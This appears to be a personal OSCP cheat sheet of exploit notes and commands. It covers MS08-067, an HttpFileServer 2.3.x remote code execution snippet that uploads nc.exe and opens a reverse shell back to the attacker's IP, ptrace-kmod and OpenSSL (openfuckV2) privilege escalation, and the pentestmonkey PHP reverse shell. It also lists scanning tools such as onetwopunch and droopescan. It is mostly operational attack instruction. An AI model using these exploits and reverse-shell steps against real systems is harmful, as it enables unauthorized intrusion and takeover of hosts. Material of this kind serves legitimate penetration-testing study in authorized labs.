# cheatsheets and exploit code and scripts / OSCP
 

##Windows Exploits
<details><summary>MS08-067 Python Remote Exploit</summary>
<p>
(https://www.exploit-db.com/exploits/40279)
edit `shellcode` variable with payload and adjusts NOPS to fit it
</p>
</details>

<details><summary>HttpFileServer 2.3.x RCE</summary>
<p>
Upload nc.exe into victim machine and performs a reverse shell using nc.exe
```python
	
	#change these to your webserver for uploading nc.exe
	ip_addr = "192.168.1.20" 
	local_port = "80" 
	
	#file will be uploaded to and run from C:\Users\Public, change ip and port here to catch your reverse shell
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20192.168.1.10%20443%20-e%20cmd.exe"
```
</p>
</details>



##Linux Exploits
<details><summary>Linux Kernel 2.2-4 PrivEsc (ptrace-kmod)</summary>
<p>
(https://www.exploit-db.com/exploits/3)
Works for 2.2.x and 2.4.x kernels.
```c
// include <linux/user.h> <---remove this
// add below 
#include <sys/user.h>
#include <sys/reg.h>
```
</p>
</details>

<details><summary>Mod SSL 2.8.7 OpenSSL Exploit (openfartV2.c)</summary>
<p>
(https://www.exploit-db.com/exploits/764)
commented out `#COMMAND2` variable out to download. Can be used seperately with ptrace-kmod for PrivEsc.

Usage:
1. compile code
`gcc -o openfuck openfuckV2.c -lcrypto`
_if you encounter missing ld error while compiling at victim machine, try checking PATH and make sure it is pointing to the 'ld' file_

2. In your ptrace-kmod.c directory start webserver
`python -m SimpleHTTPServer 80`
</p>
</details>


##Other Exploits
<details><summary>PHP Reverse Shell (pentest monkey)</summary>
<p>
(http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
Works like a charm in linux php LFI situations better than `system('<reverse shell bash code>');`

1. modify code
```c
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```
2. start listener to catch reverse shell
3. upload and run script
</p>
</details>


##Tools
<details><summary>Onetwopunch - wrapper for unicorn and nmap scan</summary>
<p>
(https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh) 
Scan for port using nicornscan (very fast) and chain it with nmap vuln nse script scan

1. ping sweep for online hosts into list
`nmap -v -sn 10.11.1-254 -oG all-hosts.txt`
`grep Up all-hosts.txt > online.hosts.txt`

2. download onetwopunch script
`wget https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh`
 
3. run script with nmap -sV option
`./scripts/onetwopunch.sh -t online-hosts.txt -p all -i tap0 -n -sV`
 
4. Once complete, navigate to output folder "ndir". Use command to formats all .xml output to html
`for x in $(ls *.xml); do filename=$(echo $x | sed 's/xml/html/') && xsltproc $x -o $filename; done`
`wget https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh`
`./scripts/onetwopunch.sh -t online-hosts.txt -p all -i tap0 -n -sV`

5. Navigate to output folder "ndir" and formats all .xml output to html
`for x in $(ls *.xml); do filename=$(echo $x | sed 's/xml/html/') && xsltproc $x -o $filename; done`
</p>
</details>

<details><summary>Droopescan - drupal scanner</summary>
<p>
(https://github.com/droope/droopescan)
```
git clone https://github.com/droope/droopescan.git
cd droopescan
pip install -r requirements.txt
droopescan scan drupal -u http://10.11.1.49
```
</p>
</details>



